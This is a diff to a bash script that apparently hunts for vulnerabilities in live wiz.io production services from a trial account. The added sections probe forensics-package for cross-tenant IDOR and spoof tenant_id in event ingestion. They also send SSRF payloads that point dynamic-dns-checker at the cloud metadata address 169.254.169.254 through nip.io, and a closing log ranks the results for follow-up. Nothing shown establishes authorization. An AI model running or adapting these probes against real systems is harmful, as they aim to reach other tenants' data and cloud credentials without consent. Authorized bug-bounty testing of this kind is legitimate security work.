@@ -255,10 +255,126 @@ Key queries to test:
 EOF
 sep
 
+# ----------------------------------------------------------------
+# G. Chain 9 — forensics-package.app.wiz.io cross-tenant IDOR
+# ----------------------------------------------------------------
+log "G. Chain 9 — forensics-package cross-tenant IDOR probe"
+
+MY_TENANT_ID=$(python3 -c "
+import json, sys
+try:
+    d=open('$RESULTS/jwt-tenant-info.txt').read()
+    import re
+    m=re.search(r'\"id\": \"([a-zA-Z0-9_-]+)\"', d)
+    print(m.group(1) if m else '')
+except: pass
+" 2>/dev/null)
+
+{
+  echo "My tenant ID: ${MY_TENANT_ID:-UNKNOWN}"
+  echo ""
+
+  echo "=== Confirm Lambda@Edge auth pattern (browser UA required) ==="
+  curl -sk --connect-timeout 10 \
+    -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124" \
+    "https://prod-us52.forensics-package.app.wiz.io/" 2>/dev/null | head -c 200
+  echo ""
+
+  echo "=== Baseline: probe own tenant path ==="
+  if [ -n "$MY_TENANT_ID" ]; then
+    curl -sk --connect-timeout 10 \
+      -H "Authorization: Bearer $WIZ_JWT" \
+      -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124" \
+      "https://prod-us52.forensics-package.app.wiz.io/packages/${MY_TENANT_ID}/" \
+      -v 2>&1 | head -40
+  else
+    echo "SKIP: tenant ID unknown (check jwt-tenant-info.txt)"
+  fi
+  echo ""
+
+  echo "=== NOTE: To test cross-tenant IDOR ==="
+  echo "1. Get OTHER_TENANT_ID from second account"
+  echo "2. curl -H 'Authorization: Bearer \$WIZ_JWT' \\"
+  echo "   https://prod-us52.forensics-package.app.wiz.io/packages/\$OTHER_TENANT_ID/"
+  echo "3. If 200 response with data → Critical cross-tenant IDOR"
+} | tee "$RESULTS/chain9-forensics-idor.txt"
+log "Chain 9 results → $RESULTS/chain9-forensics-idor.txt"
+sep
+
+# ----------------------------------------------------------------
+# H. Chain 10 — events-ingestion tenant spoofing
+# ----------------------------------------------------------------
+log "H. Chain 10 — events-ingestion tenant spoofing"
+
+{
+  echo "=== Get events endpoint schema ==="
+  gql_query 'query { __type(name: "IngestEventInput") { fields { name type { name kind } description } } }' \
+    | python3 -m json.tool 2>/dev/null | head -30
+  echo ""
+
+  echo "=== POST own event (baseline — should 2xx) ==="
+  curl -sk --connect-timeout 10 -X POST \
+    "https://events-ingestion.eu21.app.wiz.io/events" \
+    -H "Authorization: Bearer $WIZ_JWT" \
+    -H "Content-Type: application/json" \
+    -d "{\"events\":[{\"type\":\"test\",\"source\":\"bounty-hunter-test\",\"tenant_id\":\"${MY_TENANT_ID:-test}\"}]}" \
+    2>/dev/null | python3 -m json.tool 2>/dev/null | head -20
+  echo ""
+
+  echo "=== NOTE: To test tenant spoofing ==="
+  echo "Replace tenant_id with OTHER_TENANT_ID and check if event is attributed"
+  echo "to the other tenant's dashboard or event log."
+} | tee "$RESULTS/chain10-events-ingestion.txt"
+log "Chain 10 results → $RESULTS/chain10-events-ingestion.txt"
+sep
+
+# ----------------------------------------------------------------
+# I. Chain 7 — dynamic-dns-checker.wiz.io SSRF probe
+# ----------------------------------------------------------------
+log "I. Chain 7 — dynamic-dns-checker.wiz.io"
+
+{
+  echo "=== Fingerprint ==="
+  curl -sI --connect-timeout 10 "https://dynamic-dns-checker.wiz.io/" 2>/dev/null | head -15
+  echo ""
+  curl -sk --connect-timeout 10 "https://dynamic-dns-checker.wiz.io/" 2>/dev/null | head -c 500
+  echo ""
+
+  echo "=== Path probe ==="
+  for p in /health /api /v1 /check /dns /verify /lookup /resolve; do
+    code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 "https://dynamic-dns-checker.wiz.io${p}" 2>/dev/null)
+    echo "${code}  ${p}"
+  done
+  echo ""
+
+  echo "=== SSRF probe: supply metadata IP as domain to check ==="
+  curl -sk --connect-timeout 10 -X POST \
+    "https://dynamic-dns-checker.wiz.io/check" \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Bearer $WIZ_JWT" \
+    -d '{"domain":"169-254-169-254.nip.io","expected_ip":"169.254.169.254"}' \
+    2>/dev/null | head -c 300
+  echo ""
+
+  curl -sk --connect-timeout 10 -X POST \
+    "https://dynamic-dns-checker.wiz.io/verify" \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Bearer $WIZ_JWT" \
+    -d '{"hostname":"169-254-169-254.nip.io"}' \
+    2>/dev/null | head -c 300
+} | tee "$RESULTS/chain7-dns-checker-ssrf.txt"
+log "Chain 7 results → $RESULTS/chain7-dns-checker-ssrf.txt"
+sep
+
 log "=== Phase 4 trial account hunt COMPLETE ==="
-log "Priority order:"
-log "  1. Webhook SSRF — use portal UI to create webhook with SSRF payloads"
-log "  2. Cross-tenant IDOR — register second account and test IDs above"
-log "  3. GraphQL schema analysis — check $RESULTS/graphql-schema.txt for hidden queries"
-log "Results: $RESULTS/"
+log ""
+log "Results priority review:"
+log "  1. $RESULTS/webhook-ssrf-guide.txt  — run the SSRF payloads via portal UI"
+log "  2. $RESULTS/chain9-forensics-idor.txt — cross-tenant IDOR (needs 2nd account)"
+log "  3. $RESULTS/cross-tenant-guide.txt — cross-tenant GraphQL IDOR guide"
+log "  4. $RESULTS/graphql-schema.txt — schema analysis for hidden queries"
+log "  5. $RESULTS/chain10-events-ingestion.txt — tenant spoofing probe"
+log "  6. $RESULTS/chain7-dns-checker-ssrf.txt — DNS checker SSRF probe"
+log ""
+log "All results: $RESULTS/"
 ls -la "$RESULTS/"
